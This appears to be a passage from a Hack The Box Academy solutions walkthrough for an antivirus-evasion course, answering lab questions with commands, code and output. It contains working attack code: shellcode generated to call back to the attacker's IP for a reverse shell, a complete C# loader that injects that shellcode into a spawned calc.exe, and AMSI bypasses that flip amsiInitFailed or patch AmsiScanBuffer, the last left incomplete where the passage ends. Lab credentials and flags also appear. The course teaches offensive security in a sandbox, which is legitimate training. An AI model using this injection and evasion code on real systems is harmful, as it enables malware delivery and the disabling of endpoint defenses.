Students then need to launch the target machine in the `Dynamic Analysis` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.179.20 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[21:51:03:333] [7050:7051] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:51:03:333] [7050:7051] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled executable from the shared folder on `Pwnbox` to `C:\Alpha\Dynamic`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\Dynamic
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\Dynamic
```

Afterward, students need to start an `nc` listener on the same `PWNPO` hardcoded in the C# reverse shell executable:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

After waiting for a minute, students will notice that a reverse shell has been successfully established on the `nc` listener as the user `beta`:

```
Ncat: Connection from 10.129.179.20.
Ncat: Connection from 10.129.179.20:55243.
whoami
PS C:\> whoami
evasion-target\beta
```

At last, when reading the contents of the file `C:\Users\beta\Desktop\flag.txt`, students will attain the flag `634fb69bb4a3fe27bf1a5170e1b11e40`:

Code: powershell

```powershell
more C:\Users\beta\Desktop\flag.txt
```

```
more C:\Users\beta\Desktop\flag.txt

PS C:\> more C:\Users\beta\Desktop\flag.txt
634fb69bb4a3fe27bf1a5170e1b11e40
```

Answer: `634fb69bb4a3fe27bf1a5170e1b11e40`

# Process Injection

## Question 1

### "Write a program that spawns calc.exe and then uses PE injection to grant a reverse shell. Place it in "C:\\Alpha\\ProcessInjection" and wait up to a minute until a user runs the program. Your goal is to read the contents of flag.txt on the desktop of the user who will execute your program."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to navigate to `C:\Tools\micr0_shell` and use `micr0_shell` to generate reverse shell shellcode in C# format:

Code: powershell

```powershell
python.exe .\micr0_shell.py -i PWNIP -p PWNPO -l csharp
```

```
PS C:\Tools\micr0_shell> python.exe .\micr0_shell.py -i 10.10.14.196 -p 9001 -l csharp

███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/micr0_shell
Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255

[+]Shellcode Settings:
******** IP Address: 10.10.14.196
******** Listening Port: 9001
******** Language of desired shellcode runner: csharp
******** Shellcode array variable name: buf
******** Shell: cmd
******** Shellcode Execution: false
******** Save Shellcode to file: false

[+]Payload size: 476 bytes

[+]Shellcode format for C#

byte[] buf= new byte[476] {
0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x30,0x4c,0x8b,0x0e,0x4d,
<SNIP>};
```

Subsequently, students need to create a `Console App (.NET Framework)` project using Visual Studio 2022 and develop C# code that abuses `Portable Executable Injection` to spawn `calc.exe` and then establish a reverse shell using the `micr0_shell` shellcode:

Code: csharp

```csharp
using System;
using System.Runtime.InteropServices;

namespace NotMalware
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            byte[] buf = new byte[] { 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x42, 0x60, 0x48, 0x8b, 0x70, 0x18, 0x48, 0x8b, 0x76, 0x30, 0x4c, 0x8b, 0x0e, 0x4d, 0x8b, 0x09, 0x4d,<SNIP> };
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            uint flags = DetachedProcess | CreateNoWindow;
            CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\calc.exe", IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo);
            IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);
            IntPtr outSize;
            WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);
            uint lpflOldProtect;
            VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);
            IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

Before compiling, students need to open the `Configuration Manager...`:

![[HTB Solutions/CAPE/z. images/f7baed06866f33fe75fd0485f070ce3f_MD5.jpg]]

Under 'Active solution platform', students need to click on '<New...>':

![[HTB Solutions/CAPE/z. images/07912cc10f5b1950e5814ed4053950f5_MD5.jpg]]

Students need to select `x64`:

![[HTB Solutions/CAPE/z. images/8726376c840f79bea6434e4b7916ae59_MD5.jpg]]

Students also need to change the 'Active solution configuration' to `Release`:

![[HTB Solutions/CAPE/z. images/a892eb2d1c2ec6edae389ab28464bf56_MD5.jpg]]

Afterward, students need to build the solution with the keystrokes `Ctrl + Shift + B`:

![[HTB Solutions/CAPE/z. images/f7a8a6ede481676fee0134af50c0af2a_MD5.jpg]]

Afterward, students need to copy the compiled `x64` executable in the `Release` folder to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy C:\Tools\NotMalware\NotMalware\bin\x64\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

```
PS C:\> copy C:\Tools\NotMalware\NotMalware\bin\x64\Release\NotMalware.exe \\TSCLIENT\SharedDrive
```

Students then need to launch the target machine in the `Process Injection` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.179.20 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[21:51:03:333] [7050:7051] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:51:03:333] [7050:7051] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled executable from the shared folder on `Pwnbox`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\ProcessInjection
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\NotMalware.exe C:\Alpha\ProcessInjection
```

Afterward, students need to start an `nc` listener on the same `PWNPO` hardcoded in the C# reverse shell executable:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

After waiting for a minute, students will notice that a reverse shell has been successfully established on the `nc` listener as the user `theta`:

```
Ncat: Connection from 10.129.232.165.
Ncat: Connection from 10.129.232.165:63730.
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
evasion-target\theta
```

At last, when reading the contents of the file `C:\Users\theta\Desktop\flag.txt`, students will attain the flag `17de9751f2606408c71aa04fb4f2a88e`:

Code: powershell

```powershell
more C:\Users\theta\Desktop\flag.txt
```

```
C:\>more C:\Users\theta\Desktop\flag.txt

more C:\Users\theta\Desktop\flag.txt
17de9751f2606408c71aa04fb4f2a88e
```

Answer: `17de9751f2606408c71aa04fb4f2a88e`

# Antimalware Scan Interface

## Question 1

### "The file "C:\\Alpha\\AMSI.ps1" is blocked by Microsoft Defender Antivirus when trying to run it. Bypass AMSI and run the file to get the flag."

After spawning the target machine, students need to connect to it via `xfreerdp` using the credentials `alpha:FGQxrLW2`:

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.179.20 /u:alpha /p:FGQxrLW2 /dynamic-resolution

[21:51:03:333] [7050:7051] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:51:03:333] [7050:7051] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[21:51:03:333] [7050:7051] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

To bypass `AMSI`, students can choose one of the three methods; setting `amsiInitFailed` to `true` will be used here:

Code: powershell

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

```
PS C:\Users\alpha> [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

Subsequently, students then need to execute the script located at `C:\Alpha\AMSI.ps1`, obtaining the flag `5afb0c1409b589b78a7ba8aaef6390d9`:

Code: powershell

```powershell
$l3 = "FQwdNgIxGT";
$wboFTG1 = "EWDwosFAwS";
$oOmKqzfcTs74S3YwDlJHh = "ahQfNzIVIT";
$tRFVpNHYbv4 = "MzFWkRMxQc";
$1dluCrtVaNpZMHBnDkAS = "HTMBDAJpFi";
$JZO7sch6pbVgnPvIjU = "EwLAEfMGY=";
$FupxOsyer9R5S = "Invoke-Mimikatz";
$vesqTi6wu = "amsiScanBuffer";
$QpwgSU3aBIPDitlxb6FWA7eTj = "amsiUtils";
$Vq1kxoJRK = $l3 + $wboFTG1 + $oOmKqzfcTs74S3YwDlJHh + $tRFVpNHYbv4 + $1dluCrtVaNpZMHBnDkAS + $JZO7sch6pbVgnPvIjU;
$aZ97uUqrtljQIwTbiJOndVyR = [System.Convert]::FromBase64String($Vq1kxoJRK);
for($PsdeFcgIN=0; $PsdeFcgIN -lt $aZ97uUqrtljQIwTbiJOndVyR.count ; $PsdeFcgIN++)
{
   $aZ97uUqrtljQIwTbiJOndVyR[$PsdeFcgIN] = $aZ97uUqrtljQIwTbiJOndVyR[$PsdeFcgIN] -bxor 0x5b;
}
$VpffBGzVmZ7dLZO9uwYHXmF5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($aZ97uUqrtljQIwTbiJOndVyR)));
Write-Host $VpffBGzVmZ7dLZO9uwYHXmF5;
```

```
PS C:\Alpha> $l3 = "FQwdNgIxGT";
>> $wboFTG1 = "EWDwosFAwS";
>> $oOmKqzfcTs74S3YwDlJHh = "ahQfNzIVIT";
>> $tRFVpNHYbv4 = "MzFWkRMxQc";
>> $1dluCrtVaNpZMHBnDkAS = "HTMBDAJpFi";
>> $JZO7sch6pbVgnPvIjU = "EwLAEfMGY=";
>> $FupxOsyer9R5S = "Invoke-Mimikatz";
>> $vesqTi6wu = "amsiScanBuffer";
>> $QpwgSU3aBIPDitlxb6FWA7eTj = "amsiUtils";
>> $Vq1kxoJRK = $l3 + $wboFTG1 + $oOmKqzfcTs74S3YwDlJHh + $tRFVpNHYbv4 + $1dluCrtVaNpZMHBnDkAS + $JZO7sch6pbVgnPvIjU;
>> $aZ97uUqrtljQIwTbiJOndVyR = [System.Convert]::FromBase64String($Vq1kxoJRK);
>> for($PsdeFcgIN=0; $PsdeFcgIN -lt $aZ97uUqrtljQIwTbiJOndVyR.count ; $PsdeFcgIN++)
>> {
>>     $aZ97uUqrtljQIwTbiJOndVyR[$PsdeFcgIN] = $aZ97uUqrtljQIwTbiJOndVyR[$PsdeFcgIN] -bxor 0x5b;
>> }
>> $VpffBGzVmZ7dLZO9uwYHXmF5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($aZ97uUqrtljQIwTbiJOndVyR)));
>> Write-Host $VpffBGzVmZ7dLZO9uwYHXmF5;

5afb0c1409b589b78a7ba8aaef6390d9
```

Answer: `5afb0c1409b589b78a7ba8aaef6390d9`

# Open-Source Software

## Question 1

### "Use one of the techniques discussed in this section to run Seatbelt on the target machine. Based on the output of the AMSIProviders module, what is the value of "GUID"?"

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.122]─[htb-ac-413848@htb-qzxhxgji9h]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy the contents of `C:\Tools\Seatbelt\` to `C:\Tools\Seatbelt-PS\` and open its `Seatbelt.sln` file in Visual Studio 2022:

Code: powershell

```powershell
Copy-Item -Path C:\Tools\Seatbelt\ -Destination C:\Tools\Seatbelt-PS -Recurse
```

```
PS C:\Users\Administrator> Copy-Item -Path C:\Tools\Seatbelt\ -Destination C:\Tools\Seatbelt-PS -Recurse
```

In `Program.cs`, students need to change the visibility of the `Main` function to `public` (instead of `private`) and then build the solution (using the keystrokes `Ctrl + Shift + B`):

![[HTB Solutions/CAPE/z. images/65729d63f53cb38cfcc2e7e473be913b_MD5.jpg]]

Afterward, students need to copy the compiled executable in the `Release` folder to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy C:\Tools\Seatbelt-PS\Seatbelt\bin\Release\Seatbelt.exe \\TSCLIENT\SharedDrive\Seatbelt.exe
```

```
PS C:\Users\Administrator> copy C:\Tools\Seatbelt-PS\Seatbelt\bin\Release\Seatbelt.exe \\TSCLIENT\SharedDrive\Seatbelt.exe
```

Subsequently, students need to use [CyberChef](https://gchq.github.io/CyberChef/#recipe=Gzip\('Dynamic%20Huffman%20Coding','','',false\)To_Base64\('A-Za-z0-9%2B/%3D'\)) to `GZIP` and `Base64`\-encode `Seatbelt.exe`:

![[HTB Solutions/CAPE/z. images/6539d746005702672fe17063309d83db_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/c7b8f46636d44e590c2738cd49c28d10_MD5.jpg]]

Afterward, students need to develop a PowerShell script (as provided in the section and named 'Invoke-Seatbelt.ps1' here) to reflectively load the encoded `Seatbelt` C# assembly into memory:

Code: powershell

```powershell
function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [String]
        $args = " "
    )

    $gzipB64 = "H4sIABeUPmYA/+39BZyV1RY3AD/nORUTTBBDhtTAkCElNVQoJaGoKIyEoMDgGUrH0UHCwu4GwWt3NyhmXLEzQPHaGdfG779iPzVnAO/1vu/7fb/vxF57rd1da6899uCzrLBlWRH8//zTsu4FpM9ghbv6VOOf2/z+XOvO5PMt7w2Neb7l5LnzKlosSpcfkS5b0GJm2cKF5YtbHD67RXrJwhbzFrYYNn5SiwXls2Z3z<SNIP>"
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    $gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress);
    $seatbeltMemoryStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($seatbeltMemoryStream);

    $seatbeltArray = $seatbeltMemoryStream.ToArray();
    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);
    $oldConsoleOut = [Console]::Out;
    $StringWriter = New-Object IO.StringWriter;
    [Console]::SetOut($StringWriter);
    [Seatbelt.Program]::Main($args.Split(" "));
    [Console]::SetOut($OldConsoleOut);
    $Results = $StringWriter.ToString();
    $Results
}
```

Additionally, to bypass `AMSI`, students need to develop a PowerShell script (as provided in the `Antimalware Scan Interface` section and named 'AMSIBypass.ps1' here) that patches `amsiScanBuffer` to always return an `error code`:

Code: powershell

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
